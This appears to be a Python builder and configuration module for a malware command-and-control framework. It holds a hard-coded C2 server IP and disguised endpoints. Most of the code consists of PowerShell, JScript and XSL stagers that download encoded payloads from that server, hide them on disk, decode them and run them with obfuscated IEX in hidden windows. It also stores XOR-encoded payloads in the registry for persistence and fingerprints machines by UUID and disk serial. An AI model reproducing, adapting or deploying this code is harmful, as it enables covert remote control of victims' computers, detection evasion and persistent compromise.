import random
import string
import base64


vps = dict(
    ip='91.235.234.130',
    port='443',
)


endpoints = dict(
    login='/80b7133e-d8d7-47d7-bc05-4b635d78d8c1.aspx', #Registration EndPoint Or /login?info=
    sendcommand='/bf00f7e2-93f2-4bc6-965f-8f37c47613b2.aspx', #SendCommand EndPoint Or /send
    getcommand='/4a9e005f-b388-44ee-9315-34f8c371c1c9.aspx', #GetCommand EndPoint Or /send
    download='/42520617-04d2-484a-849f-4bf7827dead6/', #Download
    GET_CORE_Binery='/934e36e6-9d5d-4414-a929-62f8319a068a.aspx', # GET CORE Binery
    Persist='/9196d17c-c221-4e2b-a530-65ade7b7bcab.aspx', #Persist EndPoint Or /Persist
    Persist_Core='/a9efc0d1-9248-4347-aa33-6c43e667fc53.aspx', #Persist_Core EndPoint Or /Persistc
    Persist_Core_Run='/410212d2-5860-49ca-8e93-fbe1ab7850d8.aspx', #Persist_Core_Run EndPoint Or /Persistcr
)

agents = dict()
commands = dict()
times = dict()
ips = dict()
ip_country = dict()
persist_id = dict()
upload_tokens = ""
Bincode = random.randint(11, 22)
spiter_Array = ["|", "~", "@" , "_" , "*" , "(" , "}" , "+" , "^" , "."]
spiter_Array_int = random.randint(0, 9)
spiter_Array_string = spiter_Array[spiter_Array_int]
print(spiter_Array_string)
BinString = """foreach($i in (((Get-Content c:\\programdata\\db.sqlite).replace('[spiter_Array]','0')).split(","))){if($i){$n += [System.Text.Encoding]::UTF8.GetString([System.Convert]::ToInt32(($i/[bincode]),2))}};IEX $n;""".replace("[bincode]",str(Bincode))



COUNT = 1

def to_one_base64(b64):
    b64 = b64.encode('utf-8')
    b64 = base64.b64encode(b64)
    return b64.decode('utf-8')


def set_count(in_count):
    global COUNT
    COUNT = in_count


def random_str(N):
    return ''.join(random.choices(string.ascii_uppercase + string.digits, k=N))

def random_only_str(N):
    return ''.join(random.choices(string.ascii_uppercase + string.ascii_lowercase, k=N))


login_RandomToken = random_str(1)
apiy7_RandomToken = random_str(11)
apiv8_RandomToken = random_str(6)
start_RandomToken = random_str(15)
Taskname_RandomToken = random_str(15)
persist_RandomToken = ""


only_server = "http://" + vps['ip'] + ":" + vps['port'] + "/"
server = "http://" + vps['ip'] + ":" + vps['port'] + endpoints['GET_CORE_Binery'] +"?"+apiy7_RandomToken+"="+apiy7_RandomToken
server_hex = "http://" + vps['ip'] + ":" + vps['port'] + "/apiv8?"+apiv8_RandomToken+"="+apiv8_RandomToken

s = open('./payload_2022/payload_2022.ps1').read()
s = s.replace('(server)', only_server)
s = s.replace('(login)', endpoints['login'])
s = s.replace('(sendcommand)', endpoints['sendcommand'])
s = s.replace('(getcommand)', endpoints['getcommand'])


sss = open('./payload_2022/persist_payload_2022.ps1').read()
sss = sss.replace('(server)', only_server)
sss = sss.replace('(login)', endpoints['login'])
sss = sss.replace('(sendcommand)', endpoints['sendcommand'])
sss = sss.replace('(getcommand)', endpoints['getcommand'])


#core = s +" | I`E`X"
core = s
p_core = sss
p_core_un = sss
HEX = s



HTTPWebRequest = '$r=[System.Net.HTTPWebRequest]::Create("' + server + '");$r.proxy=[Net.WebRequest]::GetSystemWebProxy();$r.proxy.Credentials=[Net.CredentialCache]::DefaultCredentials;$r.UserAgent="Googlebot";$rr=$r.GetResponse();$reqstream=$rr.GetResponseStream();$sr=(New-Object System.IO.StreamReader $reqstream).ReadToEnd();Set-Content -Force -Path c:\\programdata\\db.sqlite -Value $sr'
InvokeRestMethod = 'powershell -NoProfile -ExecutionPolicy Bypass -W 1 -Command "Invoke-RestMethod -Uri ' + server + ' -OutFile c:\programdata\db.sqlite;attrib +h c:\programdata\db.sqlite"'
IWR = 'powershell -NoProfile -ExecutionPolicy Bypass -W 1 -Command "Iwr -Uri ' + server + ' -OutFile c:\programdata\db.sqlite;attrib +h c:\programdata\db.sqlite"'
StartBitsTransfer = 'powershell -NoProfile -ExecutionPolicy Bypass -W 1 -Command "Start-BitsTransfer -Source ' + server + ' -Destination c:\programdata\db.sqlite;attrib +h c:\programdata\db.sqlite"'
IWR_AND_RUN = '''Iwr -Uri "(server)" -OutFile c:\programdata\db.sqlite;attrib +h c:\programdata\db.sqlite;$x64=((gc c:\programdata\db.sqlite).replace('[spiter_Array]','0')).split(",");rm -Force c:\programdata\db.sqlite;foreach($i in $x64){if($i){$c += [System.Text.Encoding]::UTF8.GetString([System.Convert]::ToInt32(($i/bincode),2))}};I`E`X($c -Join "") '''.replace("(server)",server).replace("bincode",str(Bincode)).replace("[spiter_Array]",str(spiter_Array_string))
Start_Jobs = '''Start-Job -ScriptBlock {(saps ("pow"+$args[0]+"ll") -ArgumentList ("-ex"+"ec byp"+"ass -Window"+"Style Hid"+"den -en"+"c "+$args[1]) -WindowStyle Hidden )} -ArgumentList ("ershe","(ENCODEDCOMMAND)") | Out-Null ; sleep 3.3'''

cmd5_2 = '''powershell -w 1 $x64=(gc c:\programdata\db.sqlite).split(',');rm -Force c:\programdata\db.sqlite;foreach($i in $x64){if($i){$c += [System.Text.Encoding]::UTF8.GetString([System.Convert]::ToInt32($i,2))}};I`E`X($c -Join '')'''
cmd5_3 = '''Start-Process powershell -ArgumentList "-exec bypass -w 1 `$x64=(gc c:\programdata\db.sqlite).split(',');rm -Force c:\programdata\db.sqlite;foreach(`$i in `$x64){if(`$i){`$c += [System.Text.Encoding]::UTF8.GetString([System.Convert]::ToInt32(`$i,2))}};I`E`X(`$c -Join '')" -WindowStyle Hidden'''


One_Line_BitsTransfer = 'Start-BitsTransfer -Source ' + server + ' -Destination c:\programdata\db.sqlite;$x64=(gc c:\programdata\db.sqlite).split(",");rm -Force c:\programdata\db.sqlite;foreach($i in $x64){if($i){$c +=[System.Text.Encoding]::UTF8.GetString([System.Convert]::ToInt32($i,2))}};I`E`X($c -Join "");'

HEX_download = 'Iwr -Uri ' + server_hex + ''' -OutFile c:\programdata\onlydigit2.ini;attrib +h c:\programdata\onlydigit2.ini;((((gc c:\programdata\onlydigit2.ini))-split"(..)"|?{$_}|%{[char][convert]::ToInt16($_,16)})-join"");rm -Force c:\programdata\onlydigit2.ini|I`EX;'''
HEX_CMD = '''((((gc c:\programdata\onlydigit.ini))-split"(..)"|?{$_}|%{[char][convert]::ToInt16($_,16)})-join"");rm -Force c:\programdata\dnlydigit.ini|I`EX;'''


def persist():
    f = open("keys.txt", "r")
    lines = f.readlines()
    if lines:
        for line in lines:
            persist_uuid = line.split(":")[0]
            persist_hdd = line.split(":")[1]
            persist_id.update({persist_uuid: persist_hdd})
        #print(persist_uuid + ":" + persist_hdd)
    #print(persist_id)
    return "Persist"

def persist_RandomToken_genarator():
    global persist_RandomToken
    persist_RandomToken = random_str(100)
    return persist_RandomToken


persist_randomstring_for_key = random_only_str(11)
persist_randomstring_for_TEST = random_only_str(11)
persist_randomstring_for_FBI = random_only_str(9)
persist_randomstring_for_xsl = random_only_str(7)
persist_randomstring_for_jse = random_only_str(11)


def encode(b64):
    return base64.b64encode(b64.encode('UTF-16LE'))

#persist_core = "pwd;ls;sleep 3;notepad"
persist_core = '''$enc = [System.Text.Encoding]::UTF8;function y ($argv) {$s=$argv;$d = @();$v = 0;$c = 0;while($c -ne $s.length){$v=($v*52)+([Int32][char]$s[$c]-40);if((($c+1)%3) -eq 0){while($v -ne 0){$vv=$v%256;if($vv -gt 0){$d+=[char][Int32]$vv}$v=[Int32]($v/256)}}$c+=1;};[array]::Reverse($d);$d=[String]::Join('',$d);return $d}function x {param($string, $method);$xorkey = $enc.GetBytes("awesomepassword2023awesomepassword2023");if ($method -eq "decrypt"){$string = $enc.GetString([System.Convert]::FromBase64String($string))}$byteString = $enc.GetBytes($string);$xordData = $(for ($i = 0; $i -lt $byteString.length; ) {for ($j = 0; $j -lt $xorkey.length; $j++) {$byteString[$i] -bxor $xorkey[$j];$i++;if ($i -ge $byteString.Length) {$j = $xorkey.length;}}});$xordData = $enc.GetString($xordData);return $xordData;}$d = y (Get-ItemProperty -Path "HKLM:SOFTWARE\\(KEY)" -Name "(FBI)").(FBI);$output = x $d "decrypt";$d = y $output;I`E`X $d;'''.replace('(KEY)',persist_randomstring_for_key).replace('(FBI)',persist_randomstring_for_FBI)
persist_core = '''Start-Process powershell -ArgumentList '-exec bypass -enc (enc)' -WindowStyle Hidden'''.replace('(enc)',(encode(persist_core)).decode("utf-8"))
persist_core_un = '''$enc = [System.Text.Encoding]::UTF8;function y ($argv) {$s=$argv;$d = @();$v = 0;$c = 0;while($c -ne $s.length){$v=($v*52)+([Int32][char]$s[$c]-40);if((($c+1)%3) -eq 0){while($v -ne 0){$vv=$v%256;if($vv -gt 0){$d+=[char][Int32]$vv}$v=[Int32]($v/256)}}$c+=1;};[array]::Reverse($d);$d=[String]::Join('',$d);return $d}function x {param($string, $method);$xorkey = $enc.GetBytes("awesomepassword20233202");if ($method -eq "decrypt"){$string = $enc.GetString([System.Convert]::FromBase64String($string))}$byteString = $enc.GetBytes($string);$xordData = $(for ($i = 0; $i -lt $byteString.length; ) {for ($j = 0; $j -lt $xorkey.length; $j++) {$byteString[$i] -bxor $xorkey[$j];$i++;if ($i -ge $byteString.Length) {$j = $xorkey.length;}}});$xordData = $enc.GetString($xordData);return $xordData;}$d = y (Get-ItemProperty -Path "HKCU:SOFTWARE" -Name "Assist").Assist;$output = x $d "decrypt";$d = y $output;I`E`X $d;'''
persist_run = '''$p_id = "HWL1JAQDFPL0ILB6HRKBTCVEAA3IQ7DCSYCXHI8B62JYM9XUYNPNDP97TMUGWONTNE4CSNP918JOK2539K6DVNMFWT4G8VYBX9QS";$address = "(server)";$UID = wmic path win32_computersystemproduct get uuid;$HDD = wmic diskdrive get serialnumber;$keyooo = ($UID | select-object -Index 2).Trim() +":" + ($HDD| select-object -Index 2);function HTTPGET($ad , $req){try{$r = [System.Net.HTTPWebRequest]::Create($ad+$req);$r.Method = "GET";$r.proxy = [Net.WebRequest]::GetSystemWebProxy();$r.proxy.Credentials = [Net.CredentialCache]::DefaultCredentials;$r.KeepAlive = $false;$r.UserAgent = "Googlebot";$r.Headers.Add("Accept-Encoding", "identity");$rr = $r.GetResponse();$reqstream = $rr.GetResponseStream();$sr = New-Object System.IO.StreamReader $reqstream;$jj = $sr.ReadToEnd();$jj;}catch{Write-Host $_}};while(10){sleep 6;$gc = "apid10?"+$p_id+"="+$keyooo;$res = HTTPGET $address $gc;$x=$address+$gc;$x | out-file C:\\Intel\\utils\\x.txt;$res | out-file C:\\Intel\\utils\\res.txt;if($res){invoke-expression([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($res)));break}}'''.replace("(server)", only_server).replace('apid10',endpoints['Persist_Core'])
persist_run_un = '''$p_id = "HWL1JAQDFPL0ILB6HRKBTCVEAA3IQ7DCSYCXHI8B62JYM9XUYNPNDP97TMUGWONTNE4CSNP918JOK2539K6DVNMFWT4G8VYBX9QS";$address = "(server)";$UID = wmic path win32_computersystemproduct get uuid;$HDD = wmic diskdrive get serialnumber;$keyooo = ($UID | select-object -Index 2).Trim() +":" + ($HDD| select-object -Index 2);function HTTPGET($ad , $req){try{$r = [System.Net.HTTPWebRequest]::Create($ad+$req);$r.Method = "GET";$r.proxy = [Net.WebRequest]::GetSystemWebProxy();$r.proxy.Credentials = [Net.CredentialCache]::DefaultCredentials;$r.KeepAlive = $false;$r.UserAgent = "Googlebot";$r.Headers.Add("Accept-Encoding", "identity");$rr = $r.GetResponse();$reqstream = $rr.GetResponseStream();$sr = New-Object System.IO.StreamReader $reqstream;$jj = $sr.ReadToEnd();$jj;}catch{Write-Host $_}};while(10){sleep 6;$gc = "apid11?"+$p_id+"="+$keyooo;$res = HTTPGET $address $gc;if($res){invoke-expression([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($res)));break}}'''.replace("(server)", only_server).replace('apid11',endpoints['Persist_Core_Run'])
#persist_run = '''notepad'''


def persist_encode_basehash_b52(st):
    value = 0
    encoded = []
    while len(st) % 2 > 0:
        st = st + chr(0)
    for i in range(len(st)):
        value = value * 256 + ord(st[i])
        if (i + 1) % 2 == 0:
            for j in range(3):
                encoded.append(chr(40 + value % 52))
                value //= 52
    encoded.reverse()
    return ''.join(encoded)


def xor_crypt_string(data, key='awesomepassword2023awesomepassword2023', encode=False, decode=False):
    from itertools import cycle
    import base64
    if decode:
        data = base64.b64decode(data).decode("utf-8")
    xored = ''.join(chr(ord(x) ^ ord(y)) for (x,y) in zip(data, cycle(key)))
    if encode:
        return base64.b64encode(xored.encode()).strip()
    return xored

def xor_crypt_string_un(data, key='awesomepassword20233202', encode=False, decode=False):
    from itertools import cycle
    import base64
    if decode:
        data = base64.b64decode(data).decode("utf-8")
    xored = ''.join(chr(ord(x) ^ ord(y)) for (x,y) in zip(data, cycle(key)))
    if encode:
        return base64.b64encode(xored.encode()).strip()
    return xored


def encode_hex(b64):
    return b64.encode("utf-8").hex()


jse = '''
var (a) = '(randstr)'
var (W) = WScript.CreateObject ("WScript.Shell");
(key) = (W).RegRead("HKLM\\\Software\\\(key)\\\(TEST)")
(str2) = (key).split("").reverse().join("");

function (hex2a)((hexx)) {
    var (hex) = (hexx).toString();
    var str = '';
    for (var i = 0; i < (hex).length; i += 2)
        str += String.fromCharCode(parseInt((hex).substr(i, 2), 16));
    return str;
}

var (oExec) = (W).Run((hex2a)((str2)),0);

'''


jse = '''
var a= '(randstr)'
var w = WScript.CreateObject ("WScript.Shell");
var oExec = w.Run('powershell -NoProfile -c (".([char][int][decimal]::Round(73.2)+[char][int][decimal]::Round(68.9)+[char][int][decimal]::Round(88))((Get-ItemProperty -Path  HKLM:\\\\SOFTWARE\\\\(key) -Name (TEST)).(TEST)))',0);

'''


jse_un = '''
var (a) = '(randstr)'
var (W) = WScript.CreateObject ("WScript.Shell");
(key) = (W).RegRead("HKCU\\\Software\\\Version")
(str2) = (key).split("").reverse().join("");

function (hex2a)((hexx)) {
    var (hex) = (hexx).toString();
    var str = '';
    for (var i = 0; i < (hex).length; i += 2)
        str += String.fromCharCode(parseInt((hex).substr(i, 2), 16));
    return str;
}

var (oExec) = (W).Run((hex2a)((str2)),0);

'''


xsl_before = '''<?xml version='1.0'?>
<stylesheet
xmlns="http://www.w3.org/1999/XSL/Transform" xmlns:ms="urn:schemas-microsoft-com:xslt"
xmlns:user="placeholder"
version="1.0">
<output method="text"/>
	<ms:script implements-prefix="user" language="JScript">
	<![CDATA[
	var (x) = "";
	var (r) = new ActiveXObject("WScript.Shell");
	var (x) = (r);
	var (y) = (x);
	(y).Run("C:\\\\Windows\\\\System32\\\\spool\\\\PRINTERS\\\\(jsefile).jse");
	]]> </ms:script>
</stylesheet>
'''

xsl = '''<?xml version='1.0'?>
<stylesheet
xmlns="http://www.w3.org/1999/XSL/Transform" xmlns:ms="urn:schemas-microsoft-com:xslt"
xmlns:user="placeholder"
version="1.0">
<output method="text"/>
    <ms:script implements-prefix="user" language="JScript">
    <![CDATA[
    var (x) = "";
    var (r) = new ActiveXObject("WScript.Shell");
    var (x) = (r);
    var (y) = (x);
    (key) = (y).RegRead("HKLM\\\Software\\\(key)\\\(TEST)")
    (str2) = (key).split("").reverse().join("");

function (hex2a)((hexx)) {
    var (hex) = (hexx).toString();
    var str = '';
    for (var i = 0; i < (hex).length; i += 2)
        str += String.fromCharCode(parseInt((hex).substr(i, 2), 16));
    return str;
}

var (oExec) = (y).Exec((hex2a)((str2)));
    ]]> </ms:script>
</stylesheet>
'''


def to_b64(b64):
    b64 = b64.encode('utf-8')
    b64 = base64.b64encode(b64)
    return b64.decode('utf-8')





jse = jse.replace('(key)',persist_randomstring_for_key).replace('(TEST)',persist_randomstring_for_TEST).replace("(randstr)",random_only_str(2))
xsl = xsl.replace('(key)',persist_randomstring_for_key).replace('(TEST)',persist_randomstring_for_TEST)
xsl = xsl.replace('(jsefile)',persist_randomstring_for_jse)
#jse_bs64 = to_b64(jse.replace("(a)",random_str(1)).replace("(randstr)",random_str(2)).replace("(W)",random_str(3)).replace("(key)",random_str(4)).replace("(str2)",random_str(5)).replace("(hex2a)",random_str(6)).replace("(hexx)",random_str(7)).replace("(hex)",random_str(8)).replace("(oExec)",random_str(9)))
jse_bs64 = to_b64(jse.replace("(a)",random_only_str(1)).replace("(randstr)",random_only_str(2)).replace("(W)",random_only_str(3)).replace("(key)",random_only_str(4)).replace("(str2)",random_only_str(5)).replace("(hex2a)",random_only_str(6)).replace("(hexx)",random_only_str(7)).replace("(hex)",random_only_str(8)).replace("(oExec)",random_only_str(9)))
jse_bs64_un = to_b64(jse_un.replace("(a)",random_only_str(1)).replace("(randstr)",random_only_str(2)).replace("(W)",random_only_str(3)).replace("(key)",random_only_str(4)).replace("(str2)",random_only_str(5)).replace("(hex2a)",random_only_str(6)).replace("(hexx)",random_only_str(7)).replace("(hex)",random_only_str(8)).replace("(oExec)",random_only_str(9)))
xsl_bs64_before = to_b64(xsl.replace("(x)", random_only_str(3)).replace("(r)", random_only_str(4)).replace("(y)", random_only_str(2)))
xsl_bs64 = to_b64(xsl.replace("(x)", random_only_str(3)).replace("(r)", random_only_str(4)).replace("(y)", random_only_str(2)).replace("(key)",random_only_str(4)).replace("(str2)",random_only_str(5)).replace("(hex2a)",random_only_str(6)).replace("(hexx)",random_only_str(7)).replace("(hex)",random_only_str(8)).replace("(oExec)",random_only_str(9)))